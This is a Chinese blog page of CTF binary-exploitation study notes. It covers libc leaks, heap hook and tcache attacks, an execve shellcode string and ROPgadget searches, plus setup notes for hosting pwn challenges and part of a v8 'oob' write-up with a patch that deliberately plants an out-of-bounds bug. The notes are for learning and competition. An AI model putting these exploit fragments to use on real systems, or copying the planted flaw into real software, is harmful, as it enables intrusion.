<li><p>栈溢出那就leak一下就行了</p>
</li>
</ul>
</li>
</ul>
<h4 id="题目给定"><a href="#题目给定" class="headerlink" title="题目给定"></a>题目给定</h4><p><strong>查看版本</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings libc.so | grep GNU</span><br></pre></td></tr></table></figure>

<p>查看该版本与本地是否相同</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff libc.so &#x2F;lib&#x2F;x86..&#x2F;libc-2.27.so</span><br></pre></td></tr></table></figure>

<p><code>Binary files libc-2.27.so and /lib/x86_64-linux-gnu/libc-2.27.so differ</code></p>
<p>表示该libc与本地环境不同，故调试的时候，需要加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io &#x3D; process([&#39;.&#x2F;bin&#39;],env&#x3D;&#123;&quot;LD_PRELOAD&quot;:&quot;.&#x2F;libc-2.23.so&quot;&#125;)</span><br></pre></td></tr></table></figure>

<p>来加载，其中[‘./bin’]替换为你需要调试的二进制文件名，”./libc-2.23.so”替换成你需要加载的目标libc，这样本地调试就可以通过目标libc进行了。</p>
<h3 id="寄存器参数"><a href="#寄存器参数" class="headerlink" title="寄存器参数"></a>寄存器参数</h3><p>%rdi, %rsi, %rdx, %rcx, %r8, %r9 </p>
<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><p>进入容器的几种方法：<br>    1、exec<br>      通过docker ps 查看需要进入的容器pid<br>      执行<br>        docker exec -it 246f35c432de /bin/bash<br>      退出容器，不会关闭容器，一般使用这个方法。<br>    2、attach<br>      通过docker ps 查看需要进入的容器pid<br>      docker attach pid<br>      退出容器会关闭容器，不推荐</p>
<p>Docker进入容器的几种方法：<a href="https://blog.csdn.net/czy_6837/article/details/84325166?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf" target="_blank" rel="noopener">https://blog.csdn.net/czy_6837/article/details/84325166?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf</a></p>
<h3 id="pwn出题环境"><a href="#pwn出题环境" class="headerlink" title="pwn出题环境"></a>pwn出题环境</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652848854&amp;idx=1&amp;sn=ff537cc73e76e1ab058bd36cb76749a0&amp;chksm=bd593e1b8a2eb70d41627a1d04c1abec2c071f28c2649ddd9e313c4eda854ca4a26db20a1985&amp;mpshare=1&amp;scene=1&amp;srcid=1011dGXhepYahcla33btEWte#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652848854&amp;idx=1&amp;sn=ff537cc73e76e1ab058bd36cb76749a0&amp;chksm=bd593e1b8a2eb70d41627a1d04c1abec2c071f28c2649ddd9e313c4eda854ca4a26db20a1985&amp;mpshare=1&amp;scene=1&amp;srcid=1011dGXhepYahcla33btEWte#rd</a></p>
<h3 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h3><p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; process(&#39;.&#x2F;xxx&#39;)</span><br><span class="line">def leak(address):</span><br><span class="line">  #各种预处理</span><br><span class="line">  payload &#x3D; &quot;xxxxxxxx&quot; + address + &quot;xxxxxxxx&quot;</span><br><span class="line">  p.send(payload)</span><br><span class="line">  #各种处理</span><br><span class="line">  data &#x3D; p.recv(4)</span><br><span class="line">  log.debug(&quot;%#x &#x3D;&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))</span><br><span class="line">  return data</span><br><span class="line">d &#x3D; DynELF(leak, elf&#x3D;ELF(&quot;.&#x2F;xxx&quot;))      #初始化DynELF模块 </span><br><span class="line">systemAddress &#x3D; d.lookup(&#39;system&#39;, &#39;libc&#39;)  #在libc文件中搜索system函数的地址</span><br></pre></td></tr></table></figure>

<p>addr就是可以泄漏内存的地址</p>
<p>比如说write函数和put函数的输出参数</p>
<h3 id="setbuf"><a href="#setbuf" class="headerlink" title="setbuf"></a>setbuf</h3><p>由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。</p>
<h3 id="global-max-fast"><a href="#global-max-fast" class="headerlink" title="global max fast"></a>global max fast</h3><p>global max fast是决定使用fast bin管理的chunk的最大值</p>
<p>使用：</p>
<p>改写global max fast后，处理特定大小的chunk，进而可以在arena往后的任意地址写入一个堆地址</p>
<h3 id="markdown的页内跳转"><a href="#markdown的页内跳转" class="headerlink" title="markdown的页内跳转"></a>markdown的页内跳转</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 先定义一个锚(id)</span><br><span class="line">	&lt;span id=<span class="string">"jump"</span>&gt;Hello World&lt;/span&gt;</span><br><span class="line"></span><br><span class="line"> <span class="number">2.</span> 然后使用markdown的语法:</span><br><span class="line">	[<span class="meta">XXXX</span>](<span class="meta">#jump)</span></span><br></pre></td></tr></table></figure>

<h3 id="exp脚本"><a href="#exp脚本" class="headerlink" title="exp脚本"></a>exp脚本</h3><p>开头</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br></pre></td></tr></table></figure>

<h4 id="elf和libc区别"><a href="#elf和libc区别" class="headerlink" title="elf和libc区别"></a>elf和libc区别</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;onetime&#39;)</span><br></pre></td></tr></table></figure>

<p>got和plt是程序的，也就是ELF(‘./程序’)</p>
<p>symbols是libc的，也就是ELF(‘./libc文件’)</p>
<h4 id="接收字符串"><a href="#接收字符串" class="headerlink" title="接收字符串"></a>接收字符串</h4><h5 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&quot;\x7f&quot;)[-6:]</span><br><span class="line">canary &#x3D; &#39;\x00&#39; + p.recv(7)#这个是栈溢出泄漏的canary</span><br></pre></td></tr></table></figure>

<h5 id="show得到的"><a href="#show得到的" class="headerlink" title="show得到的"></a>show得到的</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"data:"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>) + <span class="string">'\x00\x00'</span>)</span><br></pre></td></tr></table></figure>

<h3 id="sh"><a href="#sh" class="headerlink" title="sh"></a>sh</h3><p>system(‘sh’)也可以得到shell</p>
<p><img src="/2020/11/07/23-39-undefined/image-20201109192504900.png" alt="image-20201109192504900"></p>
<h3 id="plt表和got表"><a href="#plt表和got表" class="headerlink" title="plt表和got表"></a>plt表和got表</h3><p>注意plt表可执行不可写，got表可写不可读：</p>
<p><img src="/2020/11/07/23-39-undefined/image-20201109192029254.png" alt="image-20201109192029254"></p>
<p>ptl表的地址：0x400620 - 0x4006C0附近</p>
<p><img src="/2020/11/07/23-39-undefined/image-20201109192144499.png" alt="image-20201109192144499"></p>
<p>got表地址在0x602000 - 0x602060</p>
<p><img src="/2020/11/07/23-39-undefined/image-20201109192315003.png" alt="image-20201109192315003"></p>
<ul>
<li><strong>.got</strong></li>
</ul>
<p>GOT（Global Offset Table）全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。</p>
<ul>
<li><strong>.plt</strong></li>
</ul>
<p>PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 <code>.got.plt</code> 节中拿到地址，并跳转。要么当 <code>.got.plt</code> 没有所需地址的时，触发「链接器」去找到所需地址</p>
<ul>
<li><strong>.got.plt</strong></li>
</ul>
<p>这个是 GOT 专门为 PLT 专门准备的节。说白了，<strong>.got.plt 中的值是 GOT 的一部分</strong>。它包含上述  PLT 表所需地址（已经找到的和需要去触发的）</p>
<h3 id="可控内存"><a href="#可控内存" class="headerlink" title="可控内存"></a>可控内存</h3><ul>
<li>bss段：进程按页分配内存，分配给 bss 段的内存大小至少一个页 (4k，0x1000) 大小。一般 bss 段的内容用不了这么多的空间，并且 bss 段分配的内存页拥有读写权限。</li>
<li>heap：需要泄漏堆地址</li>
</ul>
<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pwntools提供的</span></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="comment">#21字节的shellcode</span></span><br><span class="line">shellcode_x86 = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode_x86 += <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"</span></span><br><span class="line">shellcode_x86 += <span class="string">"\x0b\xcd\x80"</span></span><br></pre></td></tr></table></figure>

<h3 id="ljust"><a href="#ljust" class="headerlink" title="ljust"></a>ljust</h3><p>前面是大小，后面是填充的字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload.ljust(0x100+0x8, &quot;a&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>~/ctf-challenges/pwn/stackoverflow/stackprivot/X-CTF Quals 2016 - b0verfl0w</p>
<h3 id="更新源和软件"><a href="#更新源和软件" class="headerlink" title="更新源和软件"></a>更新源和软件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update      #更新源</span><br><span class="line">sudo apt-get upgrade     #更新软件</span><br></pre></td></tr></table></figure>

<h3 id="main-arena-offset"><a href="#main-arena-offset" class="headerlink" title="main_arena_offset"></a>main_arena_offset</h3><p>使用如下工具：</p>
<p><a href="https://github.com/Coldwave96/LibcOffset" target="_blank" rel="noopener">https://github.com/Coldwave96/LibcOffset</a></p>
<p><img src="/2020/11/07/23-39-undefined/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201119001634875.png" alt="image-20201119001634875"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base &#x3D; main_arena - main_arena_offset</span><br></pre></td></tr></table></figure>

<h3 id="offset-unsortedbin-main-arena"><a href="#offset-unsortedbin-main-arena" class="headerlink" title="offset_unsortedbin_main_arena"></a>offset_unsortedbin_main_arena</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">context.binary = <span class="string">"./babyheap_0ctf_2017"</span><span class="comment">#要指定</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offset_bin_main_arena</span><span class="params">(idx)</span>:</span></span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line">offset_unsortedbin_main_arena = offset_bin_main_arena(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main_arena &#x3D; unsortedbin_addr - offset_unsortedbin_main_arena</span><br></pre></td></tr></table></figure>

<h3 id="allocate"><a href="#allocate" class="headerlink" title="allocate"></a>allocate</h3><h4 id="calloc"><a href="#calloc" class="headerlink" title="calloc"></a>calloc</h4><p>calloc同malloc类似只是会将申请到的堆块内容清0。所以常规的unsorted bin信息泄露的方式不可行。需要使用堆溢出进行配合</p>
<h3 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h3><h4 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc_hook"></a>malloc_hook</h4><p>最常见也是最容易的一种堆利用方法。<br>malloc函数会首先检查malloc_hook的值，若不为0则会调用他。若我们能通过内存写入malloc_hook即可实现任意地址跳转<br>通过fastbin_attack攻击malloc_hook。</p>
<p>fastbin在分配时并不检查对齐情况，将fastbin的fd设置为__malloc_hook-0x23，触发fastbin attack分配得到malloc_hook上方内存空间，向malloc_hook进行写入one_gadget得到权限。</p>
<h4 id="realloc-hook"><a href="#realloc-hook" class="headerlink" title="realloc_hook"></a>realloc_hook</h4><p>一种很巧妙的利用方法。有些情况下<strong>one_gadget</strong>因为环境原因全部都不可用，这时可以通过<strong>realloc_hook</strong>来<strong>调整堆栈环境</strong>使one_gadget可用。<br>realloc函数在函数起始会检查realloc_hook的值是否为0，不为0则跳转至realloc_hook指向地址。<br>realloc_hook同malloc_hook相邻，故可通过fastbin attack一同修改两个值。</p>
<h4 id="free-hook"><a href="#free-hook" class="headerlink" title="free_hook"></a>free_hook</h4><p>同malloc_hook类似，在调用free函数时会先检验free_hook的值。<br>但是free_hook上方都是0字节。不能直接通过fastbin_attack进行攻击，可以通过修改top<br>free_hook上方，之后申请内存至free_hook修改为system地址。<br>fastbin数组在top chunk指针上方。可以通过free fastbin chunk修改fastbin数组的值使的fastbin attack可以实现。 存在限制要求堆的地址以0x56开头</p>
<p><a href="https://bbs.pediy.com/thread-246786.htm#msg_header_h1_0" target="_blank" rel="noopener">https://bbs.pediy.com/thread-246786.htm#msg_header_h1_0</a></p>
<p>###　tcache attack</p>
<h4 id="内存申请："><a href="#内存申请：" class="headerlink" title="内存申请："></a>内存申请：</h4><p>在内存分配的 malloc 函数中有多处，会将内存块移入 tcache 中。</p>
<p>（1）首先，申请的内存块符合 fastbin 大小时并且在 fastbin 内找到可用的空闲块时，会把该 fastbin 链上的其他内存块放入 tcache 中。</p>
<p>（2）其次，申请的内存块符合 smallbin 大小时并且在 smallbin 内找到可用的空闲块时，会把该 smallbin 链上的其他内存块放入 tcache 中。</p>
<p>（3）当在 unsorted bin 链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到 tcache 中，继续处理。</p>
<h4 id="tcache-取出"><a href="#tcache-取出" class="headerlink" title="tcache 取出"></a>tcache 取出</h4><p>在内存申请的开始部分，首先会判断申请大小块，在 tcache 是否存在，如果存在就直接从 tcache 中摘取，否则再使用_int_malloc 分配。</p>
<h4 id="tcache-posioning"><a href="#tcache-posioning" class="headerlink" title="tcache posioning"></a>tcache posioning</h4><p>通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。</p>
<p>可以看出 <code>tcache posioning</code> 这种方法和 fastbin attack 类似，但因为没有 size 的限制有了更大的利用范围。</p>
<h4 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h4><p>可以对同一个 chunk 多次 free</p>
<h3 id="查看ubuntu版本"><a href="#查看ubuntu版本" class="headerlink" title="查看ubuntu版本"></a>查看ubuntu版本</h3><ol>
<li>cat /proc/version</li>
<li>uname -a</li>
<li>lsb_release -a</li>
</ol>
<h3 id="ropgadget"><a href="#ropgadget" class="headerlink" title="ropgadget"></a>ropgadget</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop -- ropchain		#静态寻找rop链</span><br><span class="line"></span><br><span class="line">ROPgadget --binary ret2libc1 --string &#39;&#x2F;bin&#x2F;sh&#39;		#寻找binsh字符串</span><br><span class="line"></span><br><span class="line">ROPgadget --binary calc --only &quot;pop|ret&quot; | grep &quot;ebx&quot;	#寻找指定寄存器</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/07/16-20-undefined/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/07/16-20-undefined/" class="post-title-link" itemprop="url">pwn出题环境搭建</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-11-07 16:20:02" itemprop="dateCreated datePublished" datetime="2020-11-07T16:20:02+08:00">2020-11-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-08 16:57:01" itemprop="dateModified" datetime="2021-07-08T16:57:01+08:00">2021-07-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>周六有个校赛，要出题目和搭建环境，记录下一些有用的东西</p>
</blockquote>
<p>GCC编译中几种保护打开和关闭的参数：<a href="https://blog.csdn.net/lonyliu/article/details/90341012" target="_blank" rel="noopener">https://blog.csdn.net/lonyliu/article/details/90341012</a></p>
<ul>
<li>NX：<code>-z execstack</code> / <code>-z noexecstack</code> (关闭 / 开启)  不让执行栈上的数据，于是JMP ESP就不能用了</li>
<li>Canary：<code>-fno-stack-protector</code> /<code>-fstack-protector</code> / <code>-fstack-protector-all</code> (关闭 / 开启 / 全开启) 栈里插入cookie信息</li>
<li>PIE：<code>-no-pie</code> / <code>-pie</code> (关闭 / 开启)  地址随机化，另外打开后会有<em>get_pc_thunk</em></li>
<li>RELRO：<code>-z norelro</code> / <code>-z lazy</code> / <code>-z now</code> (关闭 / 部分开启 / 完全开启) 对GOT表具有写权限</li>
</ul>
<p><code>gcc 文件名.c -o 文件 -z execstack -fno-stack-protector -no-pie -z norelro</code></p>
<p>如何安全快速地部署多道 ctf pwn 比赛题目：<a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652848854&amp;idx=1&amp;sn=ff537cc73e76e1ab058bd36cb76749a0&amp;chksm=bd593e1b8a2eb70d41627a1d04c1abec2c071f28c2649ddd9e313c4eda854ca4a26db20a1985&amp;mpshare=1&amp;scene=1&amp;srcid=1011dGXhepYahcla33btEWte#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652848854&amp;idx=1&amp;sn=ff537cc73e76e1ab058bd36cb76749a0&amp;chksm=bd593e1b8a2eb70d41627a1d04c1abec2c071f28c2649ddd9e313c4eda854ca4a26db20a1985&amp;mpshare=1&amp;scene=1&amp;srcid=1011dGXhepYahcla33btEWte#rd</a></p>
<h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https:&#x2F;&#x2F;get.docker.com | bash -s docker --mirror Aliyun</span><br><span class="line">或者</span><br><span class="line">curl -sSL https:&#x2F;&#x2F;get.daocloud.io&#x2F;docker | sh</span><br></pre></td></tr></table></figure>

<h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker save &lt;ImageID&gt; &gt; gzip xxx.tar.gz</span><br></pre></td></tr></table></figure>

<h3 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker images</span><br></pre></td></tr></table></figure>

<h3 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker ps -a</span><br></pre></td></tr></table></figure>

<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker rm &lt;containerID&gt;</span><br></pre></td></tr></table></figure>

<h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker rmi &lt;imageID&gt;</span><br></pre></td></tr></table></figure>

<h3 id="暂停运行"><a href="#暂停运行" class="headerlink" title="暂停运行"></a>暂停运行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker stop &lt;containerID&gt;</span><br></pre></td></tr></table></figure>



<h3 id="安装ssh服务"><a href="#安装ssh服务" class="headerlink" title="安装ssh服务"></a>安装ssh服务</h3><blockquote>
<p><a href="https://blog.csdn.net/weixin_30701521/article/details/101810109" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30701521/article/details/101810109</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install openssh-client</span><br><span class="line">apt-get install openssh-server</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;ssh start</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/23/17-42-undefined/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/10/23/17-42-undefined/" class="post-title-link" itemprop="url">chrome study by v8 oob</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-10-23 17:42:36" itemprop="dateCreated datePublished" datetime="2020-10-23T17:42:36+08:00">2020-10-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-20 16:59:01" itemprop="dateModified" datetime="2021-04-20T16:59:01+08:00">2021-04-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/chrome/" itemprop="url" rel="index"><span itemprop="name">chrome</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>学习浏览器，从v8入手，这道题有比较详细的资料，作为入门题非常有优势。</p>
</blockquote>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="基础v8的环境搭建"><a href="#基础v8的环境搭建" class="headerlink" title="基础v8的环境搭建"></a>基础v8的环境搭建</h3><p>使用的环境：ubuntu  18.04</p>
<p>v8环境搭建：<a href="https://warm-winter.github.io/2020/10/11/v8环境搭建/" target="_blank" rel="noopener">https://warm-winter.github.io/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</a></p>
<h3 id="解题的搭建"><a href="#解题的搭建" class="headerlink" title="解题的搭建"></a>解题的搭建</h3><p>一般浏览器的出题有两种</p>
<ul>
<li>一种是diff修改v8引擎源代码，人为制造出一个漏洞，</li>
<li>另一种是直接采用某个cve漏洞。一般在大型比赛中会直接采用第二种方式，更考验选手的实战能力。</li>
</ul>
<p>出题者通常会提供一个diff文件，或直接给出一个编译过diff补丁后的浏览器程序。如果只给了一个diff文件，就需要我们自己去下载相关的commit源码，然后本地打上diff补丁，编译出浏览器程序，再进行本地调试。</p>
<p>比如starctf中的oob题目给出了一个diff文件：</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span><br><span class="line">index b027d36..ef1002f 100644</span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line">@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, "fill",</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, "oob",</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, "find",</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, "findIndex",</span><br><span class="line">     [...]</span><br></pre></td></tr></table></figure>

<p>以上截取了第一部分，对/path/v8/src/bootstrapper.cc做了修改。</p>
<p>下载v8然后利用下面的命令，将diff文件加入到v8中源代码分支中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git apply &#x2F;path&#x2F;oob.diff</span><br></pre></td></tr></table></figure>

<p>我们找到<code>bootstrapper.cc</code>文件，搜索<code>SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</code>，发现下面已经将oob函数加入进去，patch成功。</p>
<p><img src="/2020/10/23/17-42-undefined/image-20201015163516782.png" alt="image-20201015163516782"></p>
<p>最后编译出增加了diff补丁的v8程序调试即可。</p>
